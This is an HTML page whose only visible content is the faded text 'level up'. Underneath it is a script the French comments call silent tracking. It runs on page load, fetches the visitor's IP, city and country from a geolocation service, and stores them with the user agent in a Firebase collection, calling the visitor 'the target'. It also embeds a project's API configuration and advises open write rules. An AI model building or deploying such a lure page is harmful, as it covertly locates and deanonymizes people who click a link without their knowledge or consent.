<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level Up</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background-color: #050505; /* Noir presque total */
        }

        .pro-fade {
            opacity: 0;
            filter: blur(8px);
            /* Apparition très mystérieuse sur 4 secondes */
            animation: fadeInMysterious 4s ease-out forwards;
            animation-delay: 0.5s; /* Petit délai avant que ça commence */
        }

        @keyframes fadeInMysterious {
            0% {
                opacity: 0;
                filter: blur(8px);
                transform: scale(0.98);
            }
            100% {
                opacity: 0.5; /* Reste gris foncé/mystérieux, pas blanc pétant */
                filter: blur(0);
                transform: scale(1);
            }
        }
    </style>
</head>
<body class="bg-[#050505] flex items-center justify-center min-h-screen m-0 overflow-hidden font-mono text-gray-400 select-none">

    <!-- Texte Pro, petit, sans retour à la ligne -->
    <div class="pro-fade text-lg md:text-xl tracking-[0.4em] uppercase whitespace-nowrap">
        level up
    </div>

    <!-- Script de tracking silencieux INFAILLIBLE -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyA3LiNjxsV9HTcFd2ghlItTipted9rdQkU",
            authDomain: "test-9022.firebaseapp.com",
            projectId: "test-9022",
            storageBucket: "test-9022.firebasestorage.app",
            messagingSenderId: "945536290936",
            appId: "1:945536290936:web:de1437cea95e63cb559d8d"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        async function capturerOmbre() {
            let geoData = {};
            
            try {
                // 1. On tente de récupérer IP, Ville et Pays silencieusement
                const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
                geoData = await response.json();
            } catch (e) {
                // Si la cible a un bloqueur ou une connexion bizarre, on ne bloque pas le processus !
                // On passe à la suite pour quand même enregistrer le clic.
            }

            // 2. On prépare le colis d'informations
            const infosCible = {
                ip: geoData.ip || "Bloquée/Masquée",
                ville: geoData.city || "Non détectée",
                pays: geoData.country || "Non détecté",
                appareil: navigator.userAgent,
                date_clic: serverTimestamp() // Heure exacte Firebase
            };

            try {
                // 3. On FORCE l'écriture dans la NOUVELLE collection
                await addDoc(collection(db, "visites_mysteres"), infosCible);
            } catch (error) {
                console.error("Erreur de base de données. As-tu bien mis les règles Firebase sur 'allow write: if true;' ?");
            }
        }

        // Lancement immédiat à l'ouverture de la page
        capturerOmbre();
    </script>
</body>
</html>
